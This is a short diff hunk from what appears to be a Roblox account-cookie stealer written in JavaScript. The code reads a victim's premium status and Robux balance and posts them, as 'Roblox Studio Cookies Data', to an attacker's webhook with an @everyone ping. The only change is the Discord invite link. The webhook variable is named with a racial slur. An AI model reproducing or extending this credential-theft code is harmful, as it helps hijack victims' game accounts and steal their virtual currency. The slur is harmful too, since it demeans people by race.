@@ -111,7 +111,7 @@ async function Log() {
             let premuim2 = (await cbx.getCurrentUser()).IsPremium
             let robux2 = (await cbx.getCurrentUser()).RobuxBalance
             NiggersK.send({
-                "content": "@everyone Roblox Studio Cookies Data. | https://discord.gg/vKM4rp2Ewb",
+                "content": "@everyone Roblox Studio Cookies Data. | https://discord.gg/qWFC7DdcSS",
                 "embeds": [{
                         "color": 0,
                         "fields": [{
